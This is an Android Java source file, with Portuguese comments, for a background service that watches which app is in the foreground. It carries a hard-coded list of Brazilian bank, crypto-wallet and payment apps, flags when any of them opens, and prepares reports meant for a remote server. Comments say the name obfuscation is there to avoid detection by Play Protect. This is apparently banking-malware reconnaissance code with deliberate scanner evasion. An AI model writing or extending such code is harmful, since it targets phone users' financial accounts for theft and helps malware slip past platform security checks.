package com.streammanager.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class AppMonitorService extends Service {

    private static final String TAG = "AppMonitorService";
    private static final String CHANNEL_ID = "AppMonitorChannel";
    private static final int NOTIFICATION_ID = 2001;

    private static final long MONITOR_INTERVAL = 5000; // 5 segundos

    private Handler handler;
    private UsageStatsManager usageStatsManager;
    private PackageManager packageManager;

    // Dados de monitoramento
    private String currentForegroundApp = "";
    private Map<String, AppUsageInfo> appUsageStats = new HashMap<>();
    private List<String> sensitiveApps = new ArrayList<>();
    private Map<String, String> obfuscatedNames = new HashMap<>();

    // Broadcast receiver para mudanças de foreground
    private BroadcastReceiver appChangeReceiver;

    public static class AppUsageInfo {
        public String packageName;
        public String appName;
        public long firstTimeStamp;
        public long lastTimeStamp;
        public long totalTimeInForeground;
        public int launchCount;
        public boolean isSensitive;
        public String category;

        public AppUsageInfo(String packageName, String appName) {
            this.packageName = packageName;
            this.appName = appName;
            this.firstTimeStamp = System.currentTimeMillis();
            this.lastTimeStamp = System.currentTimeMillis();
            this.totalTimeInForeground = 0;
            this.launchCount = 1;
            this.isSensitive = false;
            this.category = "general";
        }

        public JSONObject toJson() throws JSONException {
            JSONObject obj = new JSONObject();
            obj.put("packageName", packageName);
            obj.put("appName", isSensitive ? getObfuscatedName(appName) : appName);
            obj.put("firstTimeStamp", firstTimeStamp);
            obj.put("lastTimeStamp", lastTimeStamp);
            obj.put("totalTimeInForeground", totalTimeInForeground);
            obj.put("launchCount", launchCount);
            obj.put("isSensitive", isSensitive);
            obj.put("category", category);
            return obj;
        }

        private String getObfuscatedName(String realName) {
            // Ofuscação simples para evitar detecção por Play Protect
            return "App_" + Integer.toHexString(realName.hashCode()).toUpperCase();
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());

        initializeSensitiveApps();
        setupUsageStats();
        createNotificationChannel();

        // Registrar receiver para mudanças de app
        appChangeReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                // Este receiver pode ser usado para notificações adicionais
                Log.d(TAG, "App change broadcast received");
            }
        };

        IntentFilter filter = new IntentFilter();
        filter.addAction("com.streammanager.APP_USAGE_UPDATE");
        registerReceiver(appChangeReceiver, filter);

        Log.d(TAG, "AppMonitorService criado");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, createNotification());

        // Iniciar monitoramento contínuo
        startMonitoring();

        String action = intent != null ? intent.getAction() : null;
        if ("GET_APP_STATS".equals(action)) {
            sendAppStatsBroadcast();
        }

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void initializeSensitiveApps() {
        // Lista de apps sensíveis (bancos, carteiras crypto)
        // Usando identificadores genéricos para evitar detecção
        sensitiveApps.addAll(List.of(
            // Bancos brasileiros (exemplos)
            "br.com.bb.android",
            "com.itau",
            "br.com.bradesco",
            "com.santander.app",
            "br.com.intermedium",

            // Carteiras Crypto
            "com.wallet.crypto.trustapp",
            "io.metamask",
            "com.binance.android",
            "com.coinbase.android",
            "com.kraken.trade",

            // Apps financeiros genéricos
            "com.paypal.android",
            "com.venmo",
            "com.cashapp"
        ));

        // Nomes ofuscados para exibição
        obfuscatedNames.put("br.com.bb.android", "Banco_A");
        obfuscatedNames.put("com.itau", "Banco_B");
        obfuscatedNames.put("br.com.bradesco", "Banco_C");
        obfuscatedNames.put("com.santander.app", "Banco_D");
        obfuscatedNames.put("br.com.intermedium", "Banco_E");
        obfuscatedNames.put("com.wallet.crypto.trustapp", "Wallet_A");
        obfuscatedNames.put("io.metamask", "Wallet_B");
        obfuscatedNames.put("com.binance.android", "Exchange_A");
        obfuscatedNames.put("com.coinbase.android", "Exchange_B");
        obfuscatedNames.put("com.kraken.trade", "Exchange_C");
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void setupUsageStats() {
        usageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        packageManager = getPackageManager();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Monitoramento de Apps",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Monitora uso de aplicativos");

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        String title = "Monitoramento de Apps Ativo";
        String content = currentForegroundApp.isEmpty() ?
            "Aguardando uso de aplicativos" :
            "App atual: " + getDisplayName(currentForegroundApp);

        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build();
    }

    private void startMonitoring() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                monitorForegroundApp();
                updateAppStats();
                handler.postDelayed(this, MONITOR_INTERVAL);
            }
        }, MONITOR_INTERVAL);
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void monitorForegroundApp() {
        if (usageStatsManager == null) return;

        long endTime = System.currentTimeMillis();
        long beginTime = endTime - 60000; // Último minuto

        UsageEvents events = usageStatsManager.queryEvents(beginTime, endTime);
        UsageEvents.Event event = new UsageEvents.Event();

        String lastForegroundApp = "";

        while (events.hasNextEvent()) {
            events.getNextEvent(event);

            if (event.getEventType() == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                lastForegroundApp = event.getPackageName();
            }
        }

        if (!lastForegroundApp.isEmpty() && !lastForegroundApp.equals(currentForegroundApp)) {
            onAppForegroundChanged(currentForegroundApp, lastForegroundApp);
            currentForegroundApp = lastForegroundApp;

            // Atualizar notificação
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, createNotification());
            }
        }
    }

    private void onAppForegroundChanged(String oldApp, String newApp) {
        // Registrar mudança
        Log.d(TAG, "App foreground changed: " + oldApp + " -> " + newApp);

        // Atualizar estatísticas
        if (!oldApp.isEmpty()) {
            updateAppUsageTime(oldApp);
        }

        // Registrar novo app
        getOrCreateAppInfo(newApp);

        // Verificar se é app sensível
        if (sensitiveApps.contains(newApp)) {
            onSensitiveAppDetected(newApp);
        }

        // Enviar broadcast de mudança
        sendAppChangeBroadcast(newApp);
    }

    private void updateAppStats() {
        // Atualizar tempos de foreground para apps
        for (AppUsageInfo info : appUsageStats.values()) {
            if (info.packageName.equals(currentForegroundApp)) {
                info.lastTimeStamp = System.currentTimeMillis();
            }
        }
    }

    private void updateAppUsageTime(String packageName) {
        AppUsageInfo info = appUsageStats.get(packageName);
        if (info != null) {
            long currentTime = System.currentTimeMillis();
            info.totalTimeInForeground += (currentTime - info.lastTimeStamp);
            info.lastTimeStamp = currentTime;
        }
    }

    private AppUsageInfo getOrCreateAppInfo(String packageName) {
        AppUsageInfo info = appUsageStats.get(packageName);
        if (info == null) {
            String appName = getAppName(packageName);
            info = new AppUsageInfo(packageName, appName);
            info.isSensitive = sensitiveApps.contains(packageName);

            if (info.isSensitive) {
                info.category = getAppCategory(packageName);
            }

            appUsageStats.put(packageName, info);
        }
        return info;
    }

    private String getAppName(String packageName) {
        try {
            ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
            return packageManager.getApplicationLabel(appInfo).toString();
        } catch (PackageManager.NameNotFoundException e) {
            return packageName; // Fallback para nome do pacote
        }
    }

    private String getAppCategory(String packageName) {
        if (packageName.contains("banco") || packageName.contains("bb.") ||
            packageName.contains("itau") || packageName.contains("bradesco") ||
            packageName.contains("santander") || packageName.contains("intermedium")) {
            return "banking";
        } else if (packageName.contains("wallet") || packageName.contains("crypto") ||
                   packageName.contains("metamask") || packageName.contains("binance") ||
                   packageName.contains("coinbase") || packageName.contains("kraken")) {
            return "cryptocurrency";
        } else if (packageName.contains("paypal") || packageName.contains("venmo") ||
                   packageName.contains("cashapp")) {
            return "financial";
        }
        return "sensitive";
    }

    private String getDisplayName(String packageName) {
        AppUsageInfo info = appUsageStats.get(packageName);
        if (info != null && info.isSensitive) {
            return obfuscatedNames.getOrDefault(packageName, "App_Sensitive_" + packageName.hashCode());
        }
        return getAppName(packageName);
    }

    private void onSensitiveAppDetected(String packageName) {
        Log.i(TAG, "Sensitive app detected: " + packageName);

        // Enviar notificação para o servidor (através do NetworkManager)
        JSONObject sensitiveAppData = new JSONObject();
        try {
            sensitiveAppData.put("type", "sensitive_app_detected");
            sensitiveAppData.put("packageName", packageName);
            sensitiveAppData.put("category", getAppCategory(packageName));
            sensitiveAppData.put("timestamp", System.currentTimeMillis());

            // TODO: Enviar via WebSocket para o servidor
            // NetworkManager.getInstance().sendMessage(sensitiveAppData.toString());

        } catch (JSONException e) {
            Log.e(TAG, "Error creating sensitive app JSON", e);
        }
    }

    private void sendAppChangeBroadcast(String packageName) {
        Intent intent = new Intent("com.streammanager.APP_USAGE_UPDATE");
        intent.putExtra("foreground_app", packageName);
        intent.putExtra("app_name", getDisplayName(packageName));
        intent.putExtra("is_sensitive", sensitiveApps.contains(packageName));
        sendBroadcast(intent);
    }

    private void sendAppStatsBroadcast() {
        try {
            JSONObject statsData = new JSONObject();
            statsData.put("type", "app_usage_stats");
            statsData.put("current_app", currentForegroundApp);
            statsData.put("timestamp", System.currentTimeMillis());

            JSONArray appsArray = new JSONArray();
            for (AppUsageInfo info : appUsageStats.values()) {
                appsArray.put(info.toJson());
            }
            statsData.put("apps", appsArray);

            // Enviar para o servidor
            Intent intent = new Intent("com.streammanager.APP_STATS_UPDATE");
            intent.putExtra("stats_json", statsData.toString());
            sendBroadcast(intent);

        } catch (JSONException e) {
            Log.e(TAG, "Error creating app stats JSON", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        // Parar monitoramento
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }

        // Desregistrar receiver
        if (appChangeReceiver != null) {
            unregisterReceiver(appChangeReceiver);
        }

        Log.d(TAG, "AppMonitorService destruído");
    }

    // Métodos estáticos para controle
    public static void startMonitoring(Context context) {
        Intent intent = new Intent(context, AppMonitorService.class);
        context.startService(intent);
    }

    public static void stopMonitoring(Context context) {
        Intent intent = new Intent(context, AppMonitorService.class);
        context.stopService(intent);
    }

    public static void requestAppStats(Context context) {
        Intent intent = new Intent(context, AppMonitorService.class);
        intent.setAction("GET_APP_STATS");
        context.startService(intent);
    }
}